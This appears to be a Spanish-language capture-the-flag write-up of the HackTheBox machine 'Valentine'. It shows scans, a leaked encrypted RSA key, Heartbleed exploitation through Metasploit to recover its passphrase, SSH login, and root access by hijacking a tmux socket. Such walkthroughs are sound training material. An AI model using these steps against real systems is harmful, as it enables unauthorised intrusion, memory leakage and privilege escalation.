---
tags:
permalink: /Valentine-HTB-Writeup
title: Valentine - Easy (HTB)
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
 nmap -sCV -p22,80,443 10.129.234.7                                       
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-11 02:30 -0300
Nmap scan report for 10.129.234.7
Host is up (0.79s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_ssl-date: 2026-01-11T05:34:25+00:00; +2m37s from scanner time.
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 2m36s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.71 seconds
```

## Website 

La pagina principal no muestra mucho, solo una imagen.

![image-center](/assets/images/Pasted image 20260111023056.png)
## Shell as hype 

### Feroxbuster enum

Use `feroxbuster` para la enumeración de directorios, donde me revelo dos archivos en la ruta `/dev/`.

```bash
 feroxbuster -u http://valentine.htb -x php
<SNIP>
301      GET        9l       28w      312c http://valentine.htb/dev => http://valentine.htb/dev/
200      GET      620l     3539w   275344c http://valentine.htb/omg.jpg
200      GET        1l        2w       38c http://valentine.htb/
200      GET        8l       39w      227c http://valentine.htb/dev/notes.txt
200      GET        2l     1794w     5383c http://valentine.htb/dev/hype_key
<SNIP>
```
### id_rsa

En el archivo `notes.txt` no muestra mucha informacion.

![image-center](/assets/images/Pasted image 20260111023517.png)

En cambio por la otra, muestra un contenido de caracteres `hexadecimales`.

![image-center](/assets/images/Pasted image 20260111023723.png)
### Decrypt data

Use `tr -d ' '` para sacar los espacios, y luego con `xxd` para ver el contenido original, revelando así una clave `rsa`.

```BASH
echo 2d2d2d2d2d424547494e205253412050524956415445204b45592d2d2d2d2d0d0a50726f632d547970653a20342c454e435259505445440d0a44454b2d496e666f3a2... | xxd -r -p
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY----- 
```

### nmap vuln scan

Use el escaneo de vulnerabilidades para los 3 `puertos` revelando que el puerto `443` es vulnerable a `Heartbleed` lo cual me permite a mi como atacante exfiltrar datos encriptados.

```bash
nmap -sVC -p 22,80,443 --script vuln valentine.htb
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-11 02:50 -0300

<SNIP>
|_http-server-header: Apache/2.2.22 (Ubuntu)
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
|       http://www.openssl.org/news/secadv_20140407.txt 
|_      http://cvedetails.com/cve/2014-0160/
<SNIP>
```
### Heartbleed exploit

Para abusar de esta vulnerabilidad use el modulo `scanner/ssl/openssl_heartbleed` de metasploit.

```bash
msf auxiliary(scanner/ssl/openssl_heartbleed) > set VERBOSE true
VERBOSE => true
msf auxiliary(scanner/ssl/openssl_heartbleed) > run
[*] 10.129.234.7:443      - Leaking heartbeat response #1
[*] 10.129.234.7:443      - Sending Client Hello...
[*] 10.129.234.7:443      - SSL record #1:
[*] 10.129.234.7:443      -     Type:    22

```

Colocando el modo `Verbose` para ver las cadenas que se envían, veo que se hace una petición al archivo `decode.php` con un valor en el parámetro `text`, el cual el mismo parece estar codificado en `base64`.

```bash
<SNIP>
686; rv:45.0) Gecko/20100101 Firefox/45.0..Referer: https://127.0.0.1/decode.php..Content-Type: application/x-www-form-urlencoded..Content-Length: 42....$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==
```
### passphrase

Decodificando el mismo, obtengo la frase que me habilita el uso de la clave `id_rsa`.

```bash
echo "aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==" | base64 -d 
heartbleedbelievethehype
```

Use la misma para loguearme como el usuario `hype` ya que el nombre lo indica en el mismo archivo encontrado en `/dev/`.

```bash
ssh -i id_rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa -o HostKeyAlgorithms=+ssh-rsa hype@valentine.htb  
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

hype@Valentine:~$ cat user.txt 
b59527b2c8dadb33dffb5bd85da366d8
```
## Shell as root
### Proccess

Viendo los procesos en ejecución con `ps -faux`, veo que root esta ejecutando con `tmux` su propia sesión en el sistema.

```bash
root       1078  0.0  0.1  26416  1672 ?        Ss   22:55   0:00 /usr/bin/tmux -S /.devs/dev_sess
```
### Shell

De manera que yo como usuario de bajos privilegios puedo usar y conectarme a esa misma sesión, ejecutando `tmux -S /.devs/dev_sess`, dándome así una shell como `root`.

```bash
root@Valentine:/home/hype# whoami
root
root@Valentine:/home/hype# cat /root/root.txt 
75ae385ee00356efc95ab4388a957293
```

`~Happy Hacking.`